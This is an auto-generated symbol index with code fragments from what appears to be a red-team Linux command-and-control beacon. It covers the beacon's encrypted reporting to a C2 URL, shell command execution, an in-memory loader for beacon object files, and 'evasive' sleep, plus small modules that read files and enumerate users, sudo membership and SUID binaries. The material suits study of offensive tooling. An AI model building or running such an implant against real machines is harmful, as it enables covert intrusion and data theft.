- `volatile` (line 143) `asm volatile( // Guardar frame pointer "push %%rbp\n\t" "mov %%rsp, %%rbp\n\t" // Guardar callee-saved registers "push %%rbx\n\t" "push %%r12\n\t" "push %%r13\n\t" "push %%r14\n\t" "push %%r15\n\t" //` - *CRÍTICO: El stack DEBE estar alineado a 16 bytes ANTES del call Después de 'call', RSP está desalineado 8 bytes (por el push del return address) Entonces necesitamos RSP % 16 == 8 justo antes del call*
- `va_start` (line 193) `va_start(args, fmt);`
- `va_end` (line 197) `va_end(args);`
- `memcpy` (line 208) `memcpy(g_beacon_output + g_output_len, data, len);`
- `fprintf` (line 221) `fprintf(stderr, "[!] Trampolín: mmap falló\n");`
- `munmap` (line 237) `munmap(code, code_size);`
- `free` (line 254) `free(g_trampolines);`
- `fflush` (line 319) `fflush(stdout);`
- `snprintf` (line 326) `snprintf(full_selector, sizeof(full_selector), "/report/%s", post_data);`
- `close` (line 345) `close(sockfd);`
- `send` (line 350) `send(sockfd, req, strlen(req), 0);`
- `BIO_set_flags` (line 383) `BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);`
- `BIO_write` (line 384) `BIO_write(b64, input, len);`
- `BIO_flush` (line 385) `BIO_flush(b64);`
- `BIO_get_mem_ptr` (line 386) `BIO_get_mem_ptr(b64, &bptr);`
- `BIO_free_all` (line 390) `BIO_free_all(b64);`
- `AES_init_ctx` (line 420) `AES_init_ctx(&ctx, key);`
- `AES_ECB_encrypt` (line 428) `AES_ECB_encrypt(&ctx, encrypted_iv);`
- `memset` (line 437) `memset(iv_buf + block_size, 0, 16 - block_size);`
- `strdup` (line 478) `return strdup("[!] Empty command");`
- `pclose` (line 488) `pclose(fp);`
- `perror` (line 682) `perror("calloc");`
- `call_bof_isolated` (line 878) `call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);`
- `inet_ntop` (line 912) `inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);`
- `strcat` (line 914) `strcat(result, ip);`
- `strlen` (line 918) `return strlen(result) > 0 ? result : strdup("127.0.0.1");`
- `setvbuf` (line 996) `setvbuf(stdout, NULL, _IOLBF, 0);` - *memcpy(output, g_beacon_output, g_output_len); output[g_output_len] = '\0'; out_len = g_output_len; fprintf(stderr, "[DEBUG] run_bof_and_capture: EXIT with %d bytes\n", *out_len); fflush(stderr); return output; } === MAIN === int main() { /* Fuerza line-buffering en stdout/stderr para que se imprima todo en tiempo real*
- `printf` (line 998) `printf("[*] Beacon starting...\n");`
- `srand` (line 1001) `srand(time(NULL));`
- `sleep` (line 1028) `sleep(6);`
- `gethostname` (line 1122) `gethostname(hostname, sizeof(hostname) - 1);`
- `cJSON_AddStringToObject` (line 1130) `cJSON_AddStringToObject(root, "output", output);`
- `cJSON_AddNumberToObject` (line 1133) `cJSON_AddNumberToObject(root, "pid", (double)getpid());`
- `cJSON_AddNullToObject` (line 1138) `cJSON_AddNullToObject(root, "result_portscan");`
- `cJSON_Delete` (line 1142) `cJSON_Delete(root);`
- `RAND_bytes` (line 1148) `RAND_bytes(iv_out, 16);`

**Macros:**
- `_GNU_SOURCE` (line 1) `#define _GNU_SOURCE`
- `C2` (line 29) `#define C2`
- `CLIENT_ID` (line 31) `#define CLIENT_ID`
- `MALEABLE` (line 32) `#define MALEABLE`
- `USER_AGENTS_COUNT` (line 33) `#define USER_AGENTS_COUNT`

**Structs:**
- `MemoryStruct` (line 47) - *=== ESTRUCTURAS ===*
- `Trampoline` (line 54) - *=== TRAMPOLINES ===*
- `SymbolResolver` (line 62)
- `TrampolineCache` (line 68) - *=== CACHE DE TRAMPOLINES ===*

#### `beacon.c`
**Path:** `beacons/v2/beacon.c`

**Functions:**
- `report_result` (line 65) `static void report_result(const bsb_config_t *cfg,
                           const char *command...` - *Mesh functions would be implemented here, but for this refactor we keep the same structure as v1 with mesh stubs. A production mesh implementation would add UDP broadcast listeners, peer * relay logic, and message deduplication.*
- `execute_command` (line 138) `static char *execute_command(const bsb_config_t *cfg, const char *command)`
- `main` (line 187) `int main(void)`
- `gethostname` (line 70) `gethostname(hostname, sizeof(hostname) - 1);`
- `cJSON_AddStringToObject` (line 78) `cJSON_AddStringToObject(root, "output", output);`
- `cJSON_AddNumberToObject` (line 81) `cJSON_AddNumberToObject(root, "pid", (double)getpid());`
- `cJSON_AddNullToObject` (line 86) `cJSON_AddNullToObject(root, "result_portscan");`
- `cJSON_Delete` (line 90) `cJSON_Delete(root);`
- `free` (line 93) `free(ips);`
- `RAND_bytes` (line 99) `RAND_bytes(iv_out, 16);`
- `memcpy` (line 109) `memcpy(full_enc, iv_out, 16);`
- `snprintf` (line 115) `snprintf(report_url, sizeof(report_url), "%s%s", cfg->c2.url, cfg->c2.report_uri);`
- `srand` (line 189) `srand(time(NULL));`
- `fprintf` (line 194) `fprintf(stderr, "config error: %s\n", cfg_err);`
- `pthread_mutex_init` (line 203) `pthread_mutex_init(&g_mesh.peers_mutex, NULL);`
- `bsb_backoff_init` (line 209) `bsb_backoff_init(&backoff, cfg.backoff.base_seconds, cfg.backoff.max_seconds);`
- `sleep` (line 219) `sleep(bsb_backoff_next(&backoff));`
- `bsb_backoff_reset` (line 246) `bsb_backoff_reset(&backoff);`
- `bsb_output_cleanup` (line 257) `bsb_output_cleanup();`
- `pthread_mutex_destroy` (line 259) `pthread_mutex_destroy(&g_mesh.peers_mutex);`

**Macros:**
- `_GNU_SOURCE` (line 12) `#define _GNU_SOURCE`
- `MAX_PEERS` (line 26) `#define MAX_PEERS`
- `DISCOVERY_PORT` (line 28) `#define DISCOVERY_PORT`
- `DISCOVERY_INTERVAL` (line 29) `#define DISCOVERY_INTERVAL`
- `MAX_TTL` (line 30) `#define MAX_TTL`
- `MESH_MSG_SIZE` (line 31) `#define MESH_MSG_SIZE`

**Structs:**
- `peer_t` (line 33)
- `mesh_msg_t` (line 40)

#### `beacon.c`
**Path:** `beacons/v3/beacon.c`

**Functions:**
- `infrastructure` (line 7) `*
 * All shared infrastructure (HTTP client, crypto, BOF loader)
 * lives in beacon_common.c. Thi...`
- `compute_primes` (line 35) `static int compute_primes(int count)`
- `evasive_sleep` (line 45) `static void evasive_sleep(int seconds)`
- `report_result` (line 51) `static void report_result(const bsb_config_t *cfg,
                           const char *command...`
- `execute_command` (line 124) `static char *execute_command(const bsb_config_t *cfg, const char *command)`
- `main` (line 173) `int main(void)`
- `sleep` (line 49) `sleep(seconds);`
- `gethostname` (line 56) `gethostname(hostname, sizeof(hostname) - 1);`
- `cJSON_AddStringToObject` (line 64) `cJSON_AddStringToObject(root, "output", output);`
- `cJSON_AddNumberToObject` (line 67) `cJSON_AddNumberToObject(root, "pid", (double)getpid());`
- `cJSON_AddNullToObject` (line 72) `cJSON_AddNullToObject(root, "result_portscan");`
- `cJSON_Delete` (line 76) `cJSON_Delete(root);`
- `free` (line 79) `free(ips);`
- `RAND_bytes` (line 85) `RAND_bytes(iv_out, 16);`
- `memcpy` (line 95) `memcpy(full_enc, iv_out, 16);`
- `snprintf` (line 101) `snprintf(report_url, sizeof(report_url), "%s%s", cfg->c2.url, cfg->c2.report_uri);`
- `srand` (line 175) `srand(time(NULL));`
- `fprintf` (line 180) `fprintf(stderr, "config error: %s\n", cfg_err);`
- `bsb_backoff_init` (line 191) `bsb_backoff_init(&backoff, cfg.backoff.base_seconds, cfg.backoff.max_seconds);`
- `bsb_backoff_reset` (line 230) `bsb_backoff_reset(&backoff);`
- `bsb_output_cleanup` (line 241) `bsb_output_cleanup();`

**Macros:**
- `_GNU_SOURCE` (line 12) `#define _GNU_SOURCE`

#### `bof.c`
**Path:** `bof/cat/bof.c`

**Functions:**
- `go` (line 14) `void go(char *args, int alen)` - *bof/cat/bof.c  Read a file from disk and stream it back through the beacon.  args/alen: a NUL-terminated path string. The beacon's args parser is what usually hands us this.  Build: make bof-cat  include "beacon_api.h" include "syscalls.h"*
- `BeaconPrintf` (line 17) `BeaconPrintf(CALLBACK_OUTPUT, "[cat] missing path argument\n");`
- `BeaconOutput` (line 34) `BeaconOutput(CALLBACK_OUTPUT, buffer, (int)n);`
- `syscall1` (line 37) `syscall1(SYS_close, fd);`

#### `cat.c`
**Path:** `bof/cat/cat.c`
**File Doc:** *readfile.c — LazyOwn RedTeam BOF (Linux/x64) gcc -c -nostdlib -fPIC -m64 -O2 cat.c -o cat.x64.o define NULL ((void*)0) define CALLBACK_OUTPUT 0  Tipos*

**Functions:**
- `syscall3` (line 21) `static inline long syscall3(long n, long a1, long a2, long a3)` - *Wrappers (copiados de tus ejemplos)*
- `go` (line 30) `void go(char *args, int alen)`
- `BeaconPrintf` (line 11) `extern void BeaconPrintf(int, const char*, ...);` - *Símbolos del beacon*
- `BeaconOutput` (line 12) `extern void BeaconOutput(int, const char*, int);`
- `volatile` (line 23) `__asm__ volatile ("syscall" : "=a"(ret) : "a"(n), "D"(a1), "S"(a2), "d"(a3) : "rcx", "r11", "memory" );`

**Macros:**
- `NULL` (line 3) `#define NULL`
- `CALLBACK_OUTPUT` (line 4) `#define CALLBACK_OUTPUT`
- `SYS_openat` (line 15) `#define SYS_openat`
- `SYS_read` (line 16) `#define SYS_read`
- `SYS_close` (line 17) `#define SYS_close`
- `AT_FDCWD` (line 18) `#define AT_FDCWD`

**Type_Aliases:**
- `size_t` (line 7) `typedef unsigned long size_t;` - *Tipos*
- `ssize_t` (line 8) `typedef long ssize_t;`

#### `bof.c`
**Path:** `bof/is_sudo/bof.c`

**Functions:**
- `user_in_group` (line 14) `static int user_in_group(const char *group, const char *username, char *filebuf, long filesize)` - *bof/is_sudo/bof.c  Check whether the current user is in the sudo or wheel group.  Reads /etc/group, looks for the user's name in the member list of either group, and reports "yes" or "no" via BeaconOutput.  Build: make bof-is_sudo  include "beacon_api.h" include "syscalls.h"*
- `go` (line 56) `void go(char *args, int alen)`
- `BeaconPrintf` (line 68) `BeaconPrintf(CALLBACK_OUTPUT, "[is_sudo] uid=0 (root)\n");`
- `BeaconOutput` (line 69) `BeaconOutput(CALLBACK_OUTPUT, "yes", 0);`
- `syscall1` (line 96) `syscall1(SYS_close, fd);`

#### `is_sudo.c`
**Path:** `bof/is_sudo/is_sudo.c`
**File Doc:** *is_sudo.c — LazyOwn RedTeam BOF (Linux/x64) gcc -c -nostdlib -fPIC -m64 -O2 is_sudo.c -o is_sudo.x64.o define NULL ((void*)0) define CALLBACK_OUTPUT 0  Tipos*

**Functions:**
- `syscall3` (line 23) `static inline long syscall3(long n, long a1, long a2, long a3)` - *Wrappers*
- `syscall1` (line 32) `static inline long syscall1(long n, long a1)`
- `strcmp` (line 44) `static int strcmp(const char *s1, const char *s2)` - *strcmp mínimo (necesario para comparar strings)*
- `get_username_from_uid` (line 53) `static int get_username_from_uid(long uid, char *buf, int buf_size)` - *Obtener username desde /etc/passwd (sin libc)*
- `go` (line 108) `void go(char *args, int alen)`
- `BeaconPrintf` (line 11) `extern void BeaconPrintf(int, const char*, ...);` - *Símbolos del beacon*
- `BeaconOutput` (line 12) `extern void BeaconOutput(int, const char*, int);`
- `volatile` (line 25) `__asm__ volatile ("syscall" : "=a"(ret) : "a"(n), "D"(a1), "S"(a2), "d"(a3) : "rcx", "r11", "memory" );`

**Macros:**
- `NULL` (line 3) `#define NULL`
- `CALLBACK_OUTPUT` (line 4) `#define CALLBACK_OUTPUT`
- `SYS_openat` (line 15) `#define SYS_openat`
- `SYS_read` (line 16) `#define SYS_read`
- `SYS_close` (line 17) `#define SYS_close`
- `SYS_getuid` (line 18) `#define SYS_getuid`
- `SYS_getpwuid_r` (line 19) `#define SYS_getpwuid_r`
- `AT_FDCWD` (line 20) `#define AT_FDCWD`

**Type_Aliases:**
- `size_t` (line 7) `typedef unsigned long size_t;` - *Tipos*
- `ssize_t` (line 8) `typedef long ssize_t;`

#### `bof.c`
**Path:** `bof/suid_enum/bof.c`

**Functions:**
- `flush_output` (line 75) `static void flush_output(void)`
- `emit` (line 82) `static void emit(const char *s)`
- `format_mode` (line 105) `static void format_mode(unsigned int mode, char *out)` - *Format `mode` (a st_mode value) into a 10-char permission * string, like ls -l does.*
- `path_reset` (line 125) `static void path_reset(const char *root)`
- `path_append` (line 134) `static void path_append(const char *name)`
- `path_trim_to` (line 148) `static void path_trim_to(int len)`
- `walk` (line 158) `static void walk(int depth)` - *Walk one directory, recursing into subdirectories. `depth` * bounds the recursion so a symlink loop cannot blow the stack.*
- `go` (line 246) `void go(char *args, int alen)`
- `BeaconOutput` (line 78) `BeaconOutput(CALLBACK_OUTPUT, out_buf, out_pos);`
- `syscall1` (line 244) `syscall1(SYS_close, fd);`
- `BeaconPrintf` (line 259) `BeaconPrintf(CALLBACK_OUTPUT, "[suid_enum] scanning %s\n", root);`

**Macros:**
- `SYS_getdents64` (line 26) `#define SYS_getdents64`
- `SYS_lstat` (line 27) `#define SYS_lstat`
- `DT_UNKNOWN` (line 30) `#define DT_UNKNOWN`
- `DT_DIR` (line 31) `#define DT_DIR`
- `DT_LNK` (line 32) `#define DT_LNK`

**Structs:**
- `linux_stat` (line 35) - *#include "beacon_api.h" #include "syscalls.h" /* getdents64 syscall number (x86_64) and the dirent layout. #define SYS_getdents64 217 #define SYS_lstat      6 /* d_type values we care about (from <dirent.h>). #define DT_UNKNOWN 0 #define DT_DIR     4 #define DT_LNK     10 /* Linux stat struct (matches the kernel ABI for x86_64).*
- `linux_dirent64` (line 58) - *getdents64 entry layout (kernel ABI). The d_reclen field tells * us the actual record size since names are variable length.*

#### `bof.c`
**Path:** `bof/userenum/bof.c`

**Functions:**
- `user_in_member_list` (line 51) `static int user_in_member_list(const char *username, const char *members)`
- `go` (line 67) `void go(char *args, int alen)`
- `syscall1` (line 86) `syscall1(SYS_close, fd);`
- `copy_group_members` (line 87) `copy_group_members("sudo", gbuf, total, sudo_members, sizeof(sudo_members));`
- `BeaconPrintf` (line 93) `BeaconPrintf(CALLBACK_OUTPUT, "[userenum] cannot open /etc/passwd\n");`

#### `userenum.c`
**Path:** `bof/userenum/userenum.c`
**File Doc:** *is_sudo.c — LazyOwn RedTeam BOF (Linux/x64) gcc -c -nostdlib -fPIC -m64 -O2 userenum.c -o userenum.x64.o define NULL ((void*)0) define CALLBACK_OUTPUT 0  Tipos*

**Functions:**
- `syscall3` (line 21) `static inline long syscall3(long n, long a1, long a2, long a3)` - *Wrappers*
- `strcmp` (line 33) `static int strcmp(const char *s1, const char *s2)` - *strcmp mínimo (necesario para comparar strings)*
- `go` (line 40) `void go(char *args, int alen)`
- `BeaconPrintf` (line 11) `extern void BeaconPrintf(int, const char*, ...);` - *Símbolos del beacon*
- `BeaconOutput` (line 12) `extern void BeaconOutput(int, const char*, int);`
- `volatile` (line 23) `__asm__ volatile ("syscall" : "=a"(ret) : "a"(n), "D"(a1), "S"(a2), "d"(a3) : "rcx", "r11", "memory" );`

**Macros:**
- `NULL` (line 3) `#define NULL`
- `CALLBACK_OUTPUT` (line 4) `#define CALLBACK_OUTPUT`
- `SYS_openat` (line 15) `#define SYS_openat`
- `SYS_read` (line 16) `#define SYS_read`
- `SYS_close` (line 17) `#define SYS_close`
- `AT_FDCWD` (line 18) `#define AT_FDCWD`

**Type_Aliases:**
- `size_t` (line 7) `typedef unsigned long size_t;` - *Tipos*
- `ssize_t` (line 8) `typedef long ssize_t;`

#### `bof.c`
**Path:** `bof/whoami/bof.c`

**Functions:**
- `go` (line 18) `void go(char *args, int alen)` - *BeaconPrintf/BeaconOutput are declared in beacon_api.h, which the * beacon's loader resolves by symbol name.*
- `BeaconPrintf` (line 30) `BeaconPrintf(CALLBACK_OUTPUT, "[whoami] uid=0 (root)\n");`
- `BeaconOutput` (line 31) `BeaconOutput(CALLBACK_OUTPUT, "root", 0);`

#### `whoami.c`
**Path:** `bof/whoami/whoami.c`
**File Doc:** *whoami.c — LazyOwn RedTeam BOF (Linux/x64) define NULL ((void*)0) define CALLBACK_OUTPUT 0  Tipos*

**Functions:**
- `syscall3` (line 21) `static inline long syscall3(long n, long a1, long a2, long a3)` - *Syscall wrappers*
- `syscall1` (line 30) `static inline long syscall1(long n, long a1)`
- `go` (line 40) `void go(char *args, int alen)`
- `BeaconPrintf` (line 10) `extern void BeaconPrintf(int, const char*, ...);` - *Símbolos del beacon*
- `BeaconOutput` (line 11) `extern void BeaconOutput(int, const char*, int);`
- `volatile` (line 23) `__asm__ volatile ("syscall" : "=a"(ret) : "a"(n), "D"(a1), "S"(a2), "d"(a3) : "rcx", "r11", "memory" );`

**Macros:**
- `NULL` (line 2) `#define NULL`
- `CALLBACK_OUTPUT` (line 3) `#define CALLBACK_OUTPUT`
- `SYS_openat` (line 14) `#define SYS_openat`
- `SYS_read` (line 15) `#define SYS_read`
- `SYS_close` (line 16) `#define SYS_close`
- `SYS_getuid` (line 17) `#define SYS_getuid`
- `AT_FDCWD` (line 18) `#define AT_FDCWD`

**Type_Aliases:**
- `size_t` (line 6) `typedef unsigned long size_t;` - *Tipos*
- `ssize_t` (line 7) `typedef long ssize_t;`

#### `bof.c`
**Path:** `bof.c`
**File Doc:** *bof.c include "beacon.h"  // ← Incluir la API*

**Functions:**
- `__attribute__` (line 3) `__attribute__((used))
__attribute__((visibility("default")))
void go(char *args, int alen)` - *bof.c include "beacon.h"  // ← Incluir la API*
- `BeaconPrintf` (line 7) `BeaconPrintf(CALLBACK_OUTPUT, "[TEST BOF] Somehow, I'm still alive. Args=%.*s\n", alen, args);`

#### `cJSON.c`
**Path:** `cJSON.c`

**Functions:**
- `CJSON_PUBLIC` (line 94) `CJSON_PUBLIC(const char *) cJSON_GetErrorPtr(void)`
- `CJSON_PUBLIC` (line 99) `CJSON_PUBLIC(char *) cJSON_GetStringValue(const cJSON * const item)`
- `CJSON_PUBLIC` (line 109) `CJSON_PUBLIC(double) cJSON_GetNumberValue(const cJSON * const item)`
- `CJSON_PUBLIC` (line 124) `CJSON_PUBLIC(const char*) cJSON_Version(void)` - *CJSON_PUBLIC(double) cJSON_GetNumberValue(const cJSON * const item) { if (!cJSON_IsNumber(item)) { return (double) NAN; } return item->valuedouble; } /* This is a safeguard to prevent copy-pasters from using incompatible C and header files if (CJSON_VERSION_MAJOR != 1) || (CJSON_VERSION_MINOR != 7) || (CJSON_VERSION_PATCH != 18) error cJSON.h and cJSON.c have different versions. Make sure that both have the same. endif*
- `case_insensitive_strcmp` (line 134) `static int case_insensitive_strcmp(const unsigned char *string1, const unsigned char *string2)` - */* This is a safeguard to prevent copy-pasters from using incompatible C and header files #if (CJSON_VERSION_MAJOR != 1) || (CJSON_VERSION_MINOR != 7) || (CJSON_VERSION_PATCH != 18) #error cJSON.h and cJSON.c have different versions. Make sure that both have the same. #endif CJSON_PUBLIC(const char*) cJSON_Version(void) { static char version[15]; sprintf(version, "%i.%i.%i", CJSON_VERSION_MAJOR, CJSON_VERSION_MINOR, CJSON_VERSION_PATCH); return version; } /* Case insensitive string comparison, doesn't consider two NULL pointers equal though*
- `internal_malloc` (line 166) `static void * CJSON_CDECL internal_malloc(size_t size)` - *} return tolower(*string1) - tolower(*string2); } typedef struct internal_hooks { void *(CJSON_CDECL *allocate)(size_t size); void (CJSON_CDECL *deallocate)(void *pointer); void *(CJSON_CDECL *reallocate)(void *pointer, size_t size); } internal_hooks; #if defined(_MSC_VER) /* work around MSVC error C2322: '...' address of dllimport '...' is not static*
- `internal_free` (line 170) `static void CJSON_CDECL internal_free(void *pointer)`
- `internal_realloc` (line 174) `static void * CJSON_CDECL internal_realloc(void *pointer, size_t size)`
- `cJSON_strdup` (line 188) `static unsigned char* cJSON_strdup(const unsigned char* string, const internal_hooks * const hooks)`
- `CJSON_PUBLIC` (line 209) `CJSON_PUBLIC(void) cJSON_InitHooks(cJSON_Hooks* hooks)`
- `cJSON_New_Item` (line 242) `static cJSON *cJSON_New_Item(const internal_hooks * const hooks)` - *if (hooks->free_fn != NULL) { global_hooks.deallocate = hooks->free_fn; } /* use realloc only if both free and malloc are used global_hooks.reallocate = NULL; if ((global_hooks.allocate == malloc) && (global_hooks.deallocate == free)) { global_hooks.reallocate = realloc; } } /* Internal constructor.*
- `get_decimal_point` (line 281) `static unsigned char get_decimal_point(void)` - *item->valuestring = NULL; } if (!(item->type & cJSON_StringIsConst) && (item->string != NULL)) { global_hooks.deallocate(item->string); item->string = NULL; } global_hooks.deallocate(item); item = next; } } /* get the decimal point character of the current locale*
- `parse_number` (line 309) `static cJSON_bool parse_number(cJSON * const item, parse_buffer * const input_buffer)` - *size_t offset; size_t depth; /* How deeply nested (in arrays/objects) is the input at the current offset. internal_hooks hooks; } parse_buffer; /* check if the given size is left to read in a given parse buffer (starting with 1) #define can_read(buffer, size) ((buffer != NULL) && (((buffer)->offset + size) <= (buffer)->length)) /* check if the buffer can be accessed at the given index (starting with 0) #define can_access_at_index(buffer, index) ((buffer != NULL) && (((buffer)->offset + index) < (buffer)->length)) #define cannot_access_at_index(buffer, index) (!can_access_at_index(buffer, index)) /* get a pointer to the buffer at the position #define buffer_at_offset(buffer) ((buffer)->content + (buffer)->offset) /* Parse the input text to generate a number, and populate the result into item.*
- `ensure` (line 494) `static unsigned char* ensure(printbuffer * const p, size_t needed)` - *} typedef struct { unsigned char *buffer; size_t length; size_t offset; size_t depth; /* current nesting depth (for formatted printing) cJSON_bool noalloc; cJSON_bool format; /* is this print a formatted print internal_hooks hooks; } printbuffer; /* realloc printbuffer if necessary to have at least "needed" bytes more*
- `update_offset` (line 579) `static void update_offset(printbuffer * const buffer)` - *p->buffer = NULL; return NULL; } memcpy(newbuffer, p->buffer, p->offset + 1); p->hooks.deallocate(p->buffer); } p->length = newsize; p->buffer = newbuffer; return newbuffer + p->offset; } /* calculate the new length of the string in a printbuffer and update the offset*
- `compare_double` (line 592) `static cJSON_bool compare_double(double a, double b)` - */* calculate the new length of the string in a printbuffer and update the offset static void update_offset(printbuffer * const buffer) { const unsigned char *buffer_pointer = NULL; if ((buffer == NULL) || (buffer->buffer == NULL)) { return; } buffer_pointer = buffer->buffer + buffer->offset; buffer->offset += strlen((const char*)buffer_pointer); } /* securely comparison of floating-point variables*
- `print_number` (line 599) `static cJSON_bool print_number(const cJSON * const item, printbuffer * const output_buffer)` - *} buffer_pointer = buffer->buffer + buffer->offset; buffer->offset += strlen((const char*)buffer_pointer); } /* securely comparison of floating-point variables static cJSON_bool compare_double(double a, double b) { double maxVal = fabs(a) > fabs(b) ? fabs(a) : fabs(b); return (fabs(a - b) <= maxVal * DBL_EPSILON); } /* Render the number nicely from the given item into a string.*
- `parse_hex4` (line 669) `static unsigned parse_hex4(const unsigned char * const input)` - *output_pointer[i] = '.'; continue; } output_pointer[i] = number_buffer[i]; } output_pointer[i] = '\0'; output_buffer->offset += (size_t)length; return true; } /* parse 4 digit hexadecimal number*
- `utf16_literal_to_utf8` (line 706) `static unsigned char utf16_literal_to_utf8(const unsigned char * const input_pointer, const unsig...` - *converts a UTF-16 literal to UTF-8 * A literal can be one or two sequences of the form \uXXXX*
- `parse_string` (line 827) `static cJSON_bool parse_string(cJSON * const item, parse_buffer * const input_buffer)` - *else { (*output_pointer)[0] = (unsigned char)(codepoint & 0x7F); } output_pointer += utf8_length; return sequence_length; fail: return 0; } /* Parse the input text into an unescaped cinput, and populate item.*
- `print_string_ptr` (line 957) `static cJSON_bool print_string_ptr(const unsigned char * const input, printbuffer * const output_...` - *{ input_buffer->hooks.deallocate(output); output = NULL; } if (input_pointer != NULL) { input_buffer->offset = (size_t)(input_pointer - input_buffer->content); } return false; } /* Render the cstring provided to an escaped version that can be printed.*
- `print_string` (line 1079) `static cJSON_bool print_string(const cJSON * const item, printbuffer * const p)` - */* escape and print as unicode codepoint sprintf((char*)output_pointer, "u%04x", *input_pointer); output_pointer += 4; break; } } } output[output_length + 1] = '"'; output[output_length + 2] = '\0'; return true; } /* Invoke print_string_ptr (which is useful) on an item.*
- `buffer_skip_whitespace` (line 1093) `static parse_buffer *buffer_skip_whitespace(parse_buffer * const buffer)` - *static cJSON_bool print_string(const cJSON * const item, printbuffer * const p) { return print_string_ptr((unsigned char*)item->valuestring, p); } /* Predeclare these prototypes. static cJSON_bool parse_value(cJSON * const item, parse_buffer * const input_buffer); static cJSON_bool print_value(const cJSON * const item, printbuffer * const output_buffer); static cJSON_bool parse_array(cJSON * const item, parse_buffer * const input_buffer); static cJSON_bool print_array(const cJSON * const item, printbuffer * const output_buffer); static cJSON_bool parse_object(cJSON * const item, parse_buffer * const input_buffer); static cJSON_bool print_object(const cJSON * const item, printbuffer * const output_buffer); /* Utility to jump whitespace and cr/lf*
- `skip_utf8_bom` (line 1119) `static parse_buffer *skip_utf8_bom(parse_buffer * const buffer)` - *while (can_access_at_index(buffer, 0) && (buffer_at_offset(buffer)[0] <= 32)) { buffer->offset++; } if (buffer->offset == buffer->length) { buffer->offset--; } return buffer; } /* skip the UTF-8 BOM (byte order mark) if it is at the beginning of a buffer*
- `CJSON_PUBLIC` (line 1133) `CJSON_PUBLIC(cJSON *) cJSON_ParseWithOpts(const char *value, const char **return_parse_end, cJSON...`
- `CJSON_PUBLIC` (line 1235) `CJSON_PUBLIC(cJSON *) cJSON_ParseWithLength(const char *value, size_t buffer_length)`
- `print` (line 1242) `static unsigned char *print(const cJSON * const item, cJSON_bool format, const internal_hooks * c...` - *define cjson_min(a, b) (((a) < (b)) ? (a) : (b))*
- `CJSON_PUBLIC` (line 1315) `CJSON_PUBLIC(char *) cJSON_PrintUnformatted(const cJSON *item)`
- `CJSON_PUBLIC` (line 1320) `CJSON_PUBLIC(char *) cJSON_PrintBuffered(const cJSON *item, int prebuffer, cJSON_bool fmt)`
- `CJSON_PUBLIC` (line 1351) `CJSON_PUBLIC(cJSON_bool) cJSON_PrintPreallocated(cJSON *item, char *buffer, const int length, con...`
- `parse_value` (line 1372) `static cJSON_bool parse_value(cJSON * const item, parse_buffer * const input_buffer)` - *return false; } p.buffer = (unsigned char*)buffer; p.length = (size_t)length; p.offset = 0; p.noalloc = true; p.format = format; p.hooks = global_hooks; return print_value(item, &p); } /* Parser core - when encountering text, process appropriately.*
- `print_value` (line 1427) `static cJSON_bool print_value(const cJSON * const item, printbuffer * const output_buffer)` - *if (can_access_at_index(input_buffer, 0) && (buffer_at_offset(input_buffer)[0] == '[')) { return parse_array(item, input_buffer); } /* object if (can_access_at_index(input_buffer, 0) && (buffer_at_offset(input_buffer)[0] == '{')) { return parse_object(item, input_buffer); } return false; } /* Render a value to text.*
- `parse_array` (line 1501) `static cJSON_bool parse_array(cJSON * const item, parse_buffer * const input_buffer)` - *return print_string(item, output_buffer); case cJSON_Array: return print_array(item, output_buffer); case cJSON_Object: return print_object(item, output_buffer); default: return false; } } /* Build an array from input text.*
- `print_array` (line 1599) `static cJSON_bool print_array(const cJSON * const item, printbuffer * const output_buffer)` - *input_buffer->offset++; return true; fail: if (head != NULL) { cJSON_Delete(head); } return false; } /* Render an array to text*
- `parse_object` (line 1661) `static cJSON_bool parse_object(cJSON * const item, parse_buffer * const input_buffer)` - *output_pointer = ensure(output_buffer, 2); if (output_pointer == NULL) { return false; } output_pointer++ = ']'; output_pointer = '\0'; output_buffer->depth--; return true; } /* Build an object from the text.*
- `print_object` (line 1780) `static cJSON_bool print_object(const cJSON * const item, printbuffer * const output_buffer)` - *input_buffer->offset++; return true; fail: if (head != NULL) { cJSON_Delete(head); } return false; } /* Render an object to text.*
- `get_array_item` (line 1915) `static cJSON* get_array_item(const cJSON *array, size_t index)`
- `CJSON_PUBLIC` (line 1934) `CJSON_PUBLIC(cJSON *) cJSON_GetArrayItem(const cJSON *array, int index)`
- `get_object_item` (line 1944) `static cJSON *get_object_item(const cJSON * const object, const char * const name, const cJSON_bo...`
- `CJSON_PUBLIC` (line 1976) `CJSON_PUBLIC(cJSON *) cJSON_GetObjectItem(const cJSON * const object, const char * const string)`
- `CJSON_PUBLIC` (line 1981) `CJSON_PUBLIC(cJSON *) cJSON_GetObjectItemCaseSensitive(const cJSON * const object, const char * c...`
- `CJSON_PUBLIC` (line 1986) `CJSON_PUBLIC(cJSON_bool) cJSON_HasObjectItem(const cJSON *object, const char *string)`
- `suffix_object` (line 1993) `static void suffix_object(cJSON *prev, cJSON *item)` - *return get_object_item(object, string, false); } CJSON_PUBLIC(cJSON *) cJSON_GetObjectItemCaseSensitive(const cJSON * const object, const char * const string) { return get_object_item(object, string, true); } CJSON_PUBLIC(cJSON_bool) cJSON_HasObjectItem(const cJSON *object, const char *string) { return cJSON_GetObjectItem(object, string) ? 1 : 0; } /* Utility for array list handling.*
- `create_reference` (line 2000) `static cJSON *create_reference(const cJSON *item, const internal_hooks * const hooks)` - *CJSON_PUBLIC(cJSON_bool) cJSON_HasObjectItem(const cJSON *object, const char *string) { return cJSON_GetObjectItem(object, string) ? 1 : 0; } /* Utility for array list handling. static void suffix_object(cJSON *prev, cJSON *item) { prev->next = item; item->prev = prev; } /* Utility for handling references.*
- `add_item_to_array` (line 2020) `static cJSON_bool add_item_to_array(cJSON *array, cJSON *item)`
- `cast_away_const` (line 2066) `static void* cast_away_const(const void* string)` - */* Add item to array/object. CJSON_PUBLIC(cJSON_bool) cJSON_AddItemToArray(cJSON *array, cJSON *item) { return add_item_to_array(array, item); } #if defined(__clang__) || (defined(__GNUC__) && ((__GNUC__ > 4) || ((__GNUC__ == 4) && (__GNUC__-MINOR__ > 5)))) #pragma GCC diagnostic push #endif #ifdef __GNUC__ #pragma GCC diagnostic ignored "-Wcast-qual" #endif /* helper function to cast away const*
- `add_item_to_object` (line 2073) `static cJSON_bool add_item_to_object(cJSON * const object, const char * const string, cJSON * con...` - *if defined(__clang__) || (defined(__GNUC__) && ((__GNUC__ > 4) || ((__GNUC__ == 4) && (__GNUC__-MINOR__ > 5)))) pragma GCC diagnostic pop endif*
